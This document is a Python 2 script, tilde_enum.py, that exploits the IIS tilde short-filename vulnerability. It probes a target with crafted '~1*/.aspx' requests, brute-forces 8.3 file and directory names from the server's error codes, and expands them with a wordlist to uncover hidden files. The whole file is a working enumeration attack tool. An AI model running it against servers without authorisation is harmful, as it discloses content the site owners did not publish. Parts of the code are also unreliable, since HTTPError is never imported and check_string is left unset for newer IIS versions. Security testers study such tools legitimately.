#!/usr/bin/env python -tt

'''
-------------------------------------------------------------------------------
Name:		tilde_enum.py
Purpose:	Expands the file names found from the tilde enumeration vuln
Authors:	Ryan Tierney (nu11by73) and Micah Hoffman (@WebBreacher)
-------------------------------------------------------------------------------
'''

import os, sys, re, argparse, random, string, itertools
from urllib2 import Request, urlopen, URLError
from urlparse import urlparse

#=================================================
# Constants and Variables
#=================================================

# In the 'headers' below, change the data that you want sent to the remote server
# This is an IE10 user agent
headers = { 'User-Agent' : 'Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; WOW64; Trident/6.0)' }

# Targets is the list of files from the scanner output
targets = []

# Findings is the list of URLs that may be good on the web site
# TODO - Are all of these really necessary?
findings_file =  {}		# Files discovered
findings_other = []  	# HTTP Response Codes other than 200
findings_final = []		# Where the guessed files are output
findings_dir =   [] 	# Directories discovered
findings_dir_other =  		[]
findings_dir_final = 		[]
findings_dir_other_final =  []

# Location of the extension brute force word list
exts = 'exts'

# Character set to use for brute forcing ([0-9][a-z]_- )
chars = 'taoeiwnshrdlcumfgypbvkjxqz1234567890-_'

# Response codes - user and error
response_code = {}

#=================================================
# Functions & Classes
#=================================================

def check_os():
	# Check operating system for colorization
    if os.name == "nt":
        operating_system = "windows"
    if os.name == "posix":
        operating_system = "posix"
    return operating_system


def getWebServerResponse(url):
	# This function takes in a URL and outputs the HTTP response code and content length (or error)
	try:
		req = Request(url, None, headers)
		response = urlopen(req)
		return response
	except URLError as e:
		return e
	except HTTPError as e:
		return e
	except Exception as e:
		return 0


def initialCheckUrl(url):
	# This function checks to see if the web server is running and what kind of response codes
	# come back from bad requests (this will be important later)

	# Need to split url into protocol://host|IP and then the path
	u = urlparse(url)

	# Make a string that we can use to ensure we know what a "not found" response looks like
	not_there_string = ''.join(random.choice(string.ascii_lowercase + string.ascii_uppercase + string.digits) for x in range(10))
	print bcolors.GREEN + '[-]  Testing with dummy file request %s://%s/%s.htm' % (u.scheme, u.netloc, not_there_string) + bcolors.ENDC
	not_there_url = u.scheme + '://' + u.netloc + '/' + not_there_string + '.htm'

	# Make the dummy request to the remote server
	not_there_response = getWebServerResponse(not_there_url)

	# Create a content length
	not_there_response_content_length = len(not_there_response.read())

	if not_there_response.getcode():
		print '[-]	URLNotThere -> HTTP Code: %s, Response Length: %s' % (not_there_response.getcode(), not_there_response_content_length)
		response_code['not_there_code'], response_code['not_there_length'] = not_there_response.getcode(), not_there_response_content_length
	else:
		print '[+]	URLNotThere -> HTTP Code: %s, Error Code: %s' % (not_there_response.code, not_there_response.reason)
		response_code['not_there_code'], response_code['not_there_reason'] = not_there_response.code

	# Check if we didn't get a 404. This would indicate custom error messages or some redirection and will cause issues later.
	if response_code['not_there_code'] != 404:
		print bcolors.RED + '[!]  FALSE POSITIVE ALERT: We may have a problem determining real responses since we did not get a 404 back.' + bcolors.ENDC

	# Now that we have the "definitely not there" page, check for one that should be there
	print bcolors.GREEN + '[-]  Testing with user-submitted %s' % (url) + bcolors.ENDC
	url_response = getWebServerResponse(url)
	if url_response.getcode():
		print '[-]	URLUser -> HTTP Code: %s, Response Length: %s' % (url_response.getcode(), len(url_response.read()))
		response_code['user_code'], response_code['user_length'] = url_response.getcode(), len(url_response.read())
	else:
		print '[+]	URLUser -> HTTP Code: %s, Error Code: %s' % (url_response.code, url_response.reason)
		response_code['user_code'], response_code['user_reason'] = url_response.code, url_response.reason

	# Check if we got an HTTP response code of 200.
	if response_code['user_code'] != 200:
		print bcolors.RED + '[!]  ERROR: We did not receive an HTTP response code 200 back. Please check URL.' + bcolors.ENDC
		sys.exit()
	else:
		return response_code


def searchFileForString(string, file):
	# Open the wordlist file (or try to)
	try:
		wordlist = open(file,'r').readlines()
	except (IOError) :
		print bcolors.RED + '[!]  [Error] Can\'t read the wordlist file you entered.' + bcolors.ENDC
		sys.exit()

	matches = []
	for line in wordlist:
		if line.startswith(string.lower()):
			matches.append(line.rstrip())
	return matches


def checkForTildeVuln(url):
	# Check if the server is IIS and vuln to tilde directory enumeration
	# TODO - Need to make this more reliable than just relying on header responses
	server_header = getWebServerResponse(url)
	if 'IIS' in server_header.headers['server'] or 'icrosoft' in server_header.headers['server']:
		print bcolors.GREEN + '[+]  The server is reporting that it is IIS (%s).' % server_header.headers['server'] + bcolors.ENDC
		if '5.' in server_header.headers['server']:
			check_string = '*~1*'
		elif '6.' in server_header.headers['server']:
			check_string = '*~1*/.aspx'
		# TODO - Need to implement IIS7 check
	else:
		print bcolors.RED + '[!]  Error. Server is not reporting that it is IIS.\n[!]     (Request error: %s)\n[!]     If you know it is, use the -f flag to force testing and re-run the script.' % server_header + bcolors.ENDC
		sys.exit()

	# Check to see if the server is vulnerable to the tilde vulnerability
	resp = getWebServerResponse(args.url + '/*~1*/.aspx')
	if resp.code == 404:
		print bcolors.YELLOW + '[+]  The server is vulnerable to the tilde enumeration vulnerability.' + bcolors.ENDC
		vuln = True
	elif args.f:
		print bcolors.RED + '[!]  Error. Server is not probably NOT vulnerable to the tilde enumeration vulnerability.\n[!]     But you have used the -f switch to force us to try.' + bcolors.ENDC
	else:
		print bcolors.RED + '[!]  Error. Server is not probably NOT vulnerable to the tilde enumeration vulnerability.\n[!]     If you know it is, use the -f flag to force testing and re-run the script.' + bcolors.ENDC
		sys.exit()

	return check_string


def findExtension(url, dir, file):
	# Find out how many chars the extension has
	resp1 = getWebServerResponse(url+dir+file+'~1.%3f/.aspx')		# 1 extension chars
	resp2 = getWebServerResponse(url+dir+file+'~1.%3f%3f/.aspx')	# 2 extension chars
	resp3 = getWebServerResponse(url+dir+file+'~1.%3f%3f%3f/.aspx')	# 3+ extension chars

	if resp1.code == 404:
		for char1 in chars:
			resp1a = getWebServerResponse(url+dir+file+'~1.'+char1+'%3f%3f/.aspx')
			if resp1a.code == 404:  # Got the first valid char
				print bcolors.YELLOW + '[+]  Found extension:  ' + file+' . '+char1+bcolors.ENDC
				return file+'.'+char1

	elif resp1.code == 500 and resp2.code == 404:
		for char1 in chars:
			resp1a = getWebServerResponse(url+dir+file+'~1.'+char1+'%3f%3f/.aspx')
			if resp1a.code == 404:  # Got the first valid char
				for char2 in chars:
					resp2a = getWebServerResponse(url+dir+file+'~1.'+char1+char2+'%3f/.aspx')
					if resp2a.code == 404:  # Got the second valid char
						print bcolors.YELLOW + '[+]  Found extension:  ' +file+' . '+char1+char2+bcolors.ENDC
						return file+'.'+char1+char2

	elif resp1.code == 500 and resp2.code == 500 and resp3.code == 404:
		for char1 in chars:
			resp1a = getWebServerResponse(url+dir+file+'~1.'+char1+'%3f%3f/.aspx')
			if resp1a.code == 404:  # Got the first valid char
				for char2 in chars:
					resp2a = getWebServerResponse(url+dir+file+'~1.'+char1+char2+'%3f/.aspx')
					if resp2a.code == 404:  # Got the second valid char
						for char3 in chars:
							resp3a = getWebServerResponse(url+dir+file+'~1.'+char1+char2+char3+'%3f/.aspx')
							if resp3a.code == 404:  # Got the third valid char
								print bcolors.YELLOW + '[+]  Found extension:  ' +file+' . '+char1+char2+char3+bcolors.ENDC
								return file+'.'+char1+char2+char3


def checkEightDotThreeEnum(url, check_string, dir='/'):
	# Here is where we find the files and dirs using the 404 and 400 errors
	# If the dir var is not passed then we assume this is the root level of the server
	findings = {}
	files = []

	for char in chars:
		resp1 = getWebServerResponse(url+dir+char+check_string)
		if resp1.code == 404:  # Got the first valid char
			# Check to see if the word is longer than just this char
			resp1a = getWebServerResponse(url+dir+char+'~1*/.aspx')					# 1 filename chars
			resp2 = getWebServerResponse(url+dir+char+'%3f~1*/.aspx')				# 2 filename chars
			resp3 = getWebServerResponse(url+dir+char+'%3f%3f~1*/.aspx')				# 3 filename chars
			resp4 = getWebServerResponse(url+dir+char+'%3f%3f%3f~1*/.aspx')			# 4 filename chars
			resp5 = getWebServerResponse(url+dir+char+'%3f%3f%3f%3f~1*/.aspx')		# 5 filename chars
			resp6 = getWebServerResponse(url+dir+char+'%3f%3f%3f%3f%3f~1*/.aspx')	# 6+ filename chars

			print '1st letter %s' % char
			print resp1a.code, resp2.code, resp3.code, resp4.code, resp5.code, resp6.code


			resp_len = getWebServerResponse(url+dir+char+'%3f'+check_string)
			if resp_len.code == 404:
				print 'Another char -> ' + url+dir+char+'%3f'+check_string, resp_len.code
			elif resp_len.code == 400:
				print 'That is long enough -> ' + url+dir+char+'%3f'+check_string, resp_len.code
				file = findExtension(url, dir, char)
				files.append(file)
				continue


			for char2 in chars:
				resp2 = getWebServerResponse(url+dir+char+char2+check_string)

				if resp2.code == 404:  # Got the second valid char
					for char3 in chars:
						resp3 = getWebServerResponse(url+dir+char+char2+char3+check_string)

						if resp3.code == 404:  # Got the third valid char
							for char4 in chars:
								resp4 = getWebServerResponse(url+dir+char+char2+char3+char4+check_string)

								if resp4.code == 404:  # Got the fourth valid char
									for char5 in chars:
										resp5 = getWebServerResponse(url+dir+char+char2+char3+char4+char5+check_string)

										if resp5.code == 404:  # Got the fifth valid char
											for char6 in chars:
												resp6 = getWebServerResponse(url+dir+char+char2+char3+char4+char5+char6+check_string)

												if resp6.code == 404:  # Got the sixth valid char

													# Check to see if this is a directory or file
													resp6_dir = getWebServerResponse(url+dir+char+char2+char3+char4+char5+char6+'~1/.aspx')
													if resp6_dir.code == 404:
														print bcolors.YELLOW + '[+]  Found a new directory: ' +char+char2+char3+char4+char5+char6 + bcolors.ENDC
														findings_dir.append(char+char2+char3+char4+char5+char6)
													elif resp6.code != 500:
														print bcolors.YELLOW + '[+]  Found a new file: ' +char+char2+char3+char4+char5+char6 + bcolors.ENDC

														# Now that we have the file name, go get the extension
														file = findExtension(url, dir, char+char2+char3+char4+char5+char6)
														files.append(file)
						'''elif resp3.code == 400:
							print bcolors.YELLOW + '[+]  Found a new file: ' +char + char2 + char3 + bcolors.ENDC

							# Now that we have the file name, go get the extension
							file = findExtension(url, dir, char + char2 + char3)
							files.append(file)

				elif resp2.code == 400:
					print bcolors.YELLOW + '[+]  Found a new file: ' +char + char2 + bcolors.ENDC

					# Now that we have the file name, go get the extension
					file = findExtension(url, dir, char + char2)
					files.append(file)

		elif resp1.code == 400:
			print bcolors.YELLOW + '[+]  Found a new file: ' +char + bcolors.ENDC

			# Now that we have the file name, go get the extension
			file = findExtension(url, dir, char)
			files.append(file)'''


	# Store the file in a dictionary by directory. This will be important in the future when we do recursive tests
	findings_file[dir] = files


	findings['files'] = findings_file
	findings['dirs'] = sorted(findings_dir)
	print bcolors.GREEN + '[-]  Finished doing the 8.3 enumeration for %s.' % url + bcolors.ENDC
	return findings


def main():
	# Check the User-supplied URL
	if args.url:
		response_code = initialCheckUrl(args.url)
	else:
		print bcolors.RED + '[!] You need to enter a valid URL for us to test.' + bcolors.ENDC
		sys.exit()

	if args.v: print bcolors.PURPLE + '[+]  HTTP Response Codes: %s' % response_code + bcolors.ENDC

	# Check to see if the remote server is IIS and vulnerable to the Tilde issue
	check_string = checkForTildeVuln(args.url)


	url = urlparse(args.url)
	url_good = url.scheme + '://' + url.netloc

	# Do the initial search for files in the root of the web server
	findings = checkEightDotThreeEnum(url_good, check_string)

	if args.v:
		print bcolors.PURPLE + 'Files: %s' % findings['files']
		print 'Dirs: %s' %  findings['dirs'] + bcolors.ENDC


	# TODO - Directory recursion
	# Now that we have all the findings, repeat the above step with any findings that are directories and add those findings to the list
	# Wait to implement this as we'll have to go through and look up these 6 char words in another wordlist
	#for dir in findings['dirs']:
	#	findings = checkEightDotThreeEnum(url_good, check_string, dir)

	# Start the URL requests to the server
	print bcolors.GREEN + '[-]  Now starting the word guessing using word list calls' + bcolors.ENDC

	# Read in the extensions word list into a list
	# This is only temporary until I get the extension stuff above working
	try:
		extensions = open(exts,'r').readlines()
	except (IOError) :
		print bcolors.RED + '[!]  [Error] Can\'t read the wordlist file you entered.' + bcolors.ENDC
		sys.exit()


	# So the URL is live and gives 200s back (otherwise script would have exit'd)
    # Find matches to the filename in our word list
	for dir in findings['files'].keys():
		ext_matches= []
		for filename in findings['files'][dir]:

			# Break apart the file into filename and extension
			filename, ext_temp = os.path.splitext(filename)
			ext = ext_temp.lstrip('.')

			# Go search the user's word list file for matches for the file
			print '[+]  Searching for %s in word list' % filename
			filename_matches = searchFileForString(filename, args.wordlist)

			# If nothing came back from the search, just try use the original string
			if not filename_matches:
				filename_matches.append(filename)
			if args.v: print bcolors.PURPLE + '[+]  File name matches for %s are: %s' % (filename, filename_matches) + bcolors.ENDC

			# Go search the extension word list file for matches for the extension
			if len(ext) < 3:
				print '[-]  Extension (%s) too short to look up in word list. We will use it to bruteforce.' % ext
				ext_matches.append(ext.lower())
			else:
				print '[+]  Searching for %s in extension word list' % ext
				ext_matches = searchFileForString(ext, exts)
			if args.v: print bcolors.PURPLE + '[+]  Extension matches for %s are: %s' % (ext, ext_matches) + bcolors.ENDC


			# Now do the real hard work of cycling through each filename_matches and adding the ext_matches,
			# do the look up and examine the response codes to see if we found a file.
			for line in filename_matches:
				for e in ext_matches:
					test_response_code, test_response_length = '', ''

					url_to_try = url_good + '/' + line + '.' + e.rstrip()
					url_response = getWebServerResponse(url_to_try)

					# Pull out just the HTTP response code number
					if hasattr(url_response, 'code'):
						test_response_code = url_response.code
						test_response_length = url_response.headers['Content-Length']
					elif hasattr(url_response, 'getcode'):
						test_response_code = url_response.getcode()
						test_response_length = len(url_response.reason())
					else:
						test_response_code = 0

					if args.v: print '[+]  URL: %s  -> RESPONSE: %s' % (url_to_try, test_response_code)

					# Here is where we figure out if we found something or just found something odd
					if test_response_code == response_code['user_code']:
						print bcolors.YELLOW + '[*]  Found one! (Size %s) %s' % (test_response_length, url_to_try) + bcolors.ENDC
						findings_final.append(url_to_try + '  - Size ' + test_response_length)
					elif test_response_code != 404 and test_response_code != 400:
						print '[?]  URL: (Size %s) %s with Response: %s ' % (test_response_length, url_to_try, url_response)
						findings_other.append('HTTP Resp ' + str(test_response_code) + ' - ' + url_to_try + '  - Size ' + test_response_length)

	# Match directory names
	for dir in findings_dir:
		# Go search the user's word list file for matches for the directory name
		if args.v: print bcolors.PURPLE + '[+]  Searching for %s in word list' % dir + bcolors.ENDC
		dir_matches = searchFileForString(dir, args.wordlist)

		# If nothing came back from the search, just try use the original string
		if not dir_matches:
			dir_matches.append(dir)
		if args.v: print bcolors.PURPLE + '[+]  Directory name matches for %s are: %s' % (dir, dir_matches) + bcolors.ENDC

		# Now try to guess the live dir name
		for match in dir_matches:
			test_response_code, test_response_length = '', ''

			url_to_try = url_good + '/' + match + '/'
			url_response = getWebServerResponse(url_to_try)

			# Pull out just the HTTP response code number
			if hasattr(url_response, 'code'):
				test_response_code = url_response.code
				test_response_length = url_response.headers['Content-Length']
			elif hasattr(url_response, 'getcode'):
				test_response_code = url_response.getcode()
				test_response_length = len(url_response.reason())
			else:
				test_response_code = 0

			if args.v: print '[+]  URL: %s  -> RESPONSE: %s' % (url_to_try, test_response_code)

			# Here is where we figure out if we found something or just found something odd
			if test_response_code == response_code['user_code']:
				print bcolors.YELLOW + '[*]  Found one! (Size %s) %s' % (test_response_length, url_to_try) + bcolors.ENDC
				findings_dir_final.append(url_to_try + '  - Size ' + test_response_length)
			elif test_response_code != 404 and test_response_code != 0:
				print bcolors.YELLOW + '[?]  URL: (Size %s) %s with Response: %s ' % (test_response_length, url_to_try, url_response) + bcolors.ENDC
				findings_dir_other.append('HTTP Resp ' + str(test_response_code) + ' - ' + url_to_try + '  - Size ' + test_response_length)

	# Output findings
	if findings_final:
		print '\n---------- FINAL OUTPUT ------------------------------'
		print bcolors.YELLOW + '[*]  We found files for you to look at' + bcolors.ENDC
		for out in sorted(findings_final):
			print '[*]      %s' % out
	else:
		print bcolors.RED + '[ ]  No file full names were discovered. Sorry dude.' + bcolors.ENDC

	print bcolors.YELLOW + '\n[*]  Here are all the 8.3 names we found' + bcolors.ENDC
	for dir in findings['files'].keys():
		for filename in sorted(findings['files'][dir]):
			# Break apart the file into filename and extension
			filename, ext = os.path.splitext(filename)
			print '[*]      %s%s%s~1%s' % (url_good, dir, filename, ext)

	if findings_dir_final:
		print bcolors.YELLOW + '[*]  We found directories for you to look at' + bcolors.ENDC
		for out in sorted(findings_dir_final):
			print '[*]      %s' % out

	if findings_other:
		print bcolors.YELLOW + '\n[*]  We found URLs you check out. They were not HTTP response code 200s.' + bcolors.ENDC
		for out in sorted(findings_other):
			print '[?]      %s' % out

	if findings_dir_other:
		print bcolors.YELLOW + '\n[*]  We found directory URLs you should check out. They were not HTTP response code 200s.' + bcolors.ENDC
		for out in sorted(findings_dir_other):
			print '[?]      %s' % out


#=================================================
# START
#=================================================

# Command Line Arguments
parser = argparse.ArgumentParser(description='Expands the file names found from the tilde enumeration vuln')
parser.add_argument('-b', action='store_true', default=False, help='brute force backup extension, extensions')
parser.add_argument('-f', action='store_true', default=False, help='force testing of the server even if the headers do not report it as an IIS system')
parser.add_argument('-u', dest='url', help='URL to scan')
parser.add_argument('-v', action='store_true', default=False, help='verbose output')
parser.add_argument('wordlist', help='the wordlist file')
args = parser.parse_args()

# COLORIZATION OF OUTPUT
# The entire bcolors class was taken verbatim from the Social Engineer's Toolkit (ty @SET)
if check_os() == "posix":
	class bcolors:
		PURPLE = '\033[95m'		# Verbose
		CYAN = '\033[96m'
		DARKCYAN = '\033[36m'
		BLUE = '\033[94m'
		GREEN = '\033[92m'		# Normal
		YELLOW = '\033[93m'		# Findings
		RED = '\033[91m'		# Errors
		ENDC = '\033[0m'		# End colorization

		def disable(self):
			self.PURPLE = ''
			self.CYAN = ''
			self.BLUE = ''
			self.GREEN = ''
			self.YELLOW = ''
			self.RED = ''
			self.ENDC = ''
			self.DARKCYAN = ''

# If we are running on Windows or something like that then define colors as nothing
else:
	class bcolors:
		PURPLE = ''
		CYAN = ''
		DARKCYAN = ''
		BLUE = ''
		GREEN = ''
		YELLOW = ''
		RED = ''
		ENDC = ''

		def disable(self):
			self.PURPLE = ''
			self.CYAN = ''
			self.BLUE = ''
			self.GREEN = ''
			self.YELLOW = ''
			self.RED = ''
			self.ENDC = ''
			self.DARKCYAN = ''

if args.v:
	print bcolors.PURPLE + '[-]  Entering "Verbose Mode"....brace yourself for additional information.' + bcolors.ENDC

if __name__ == "__main__": main()


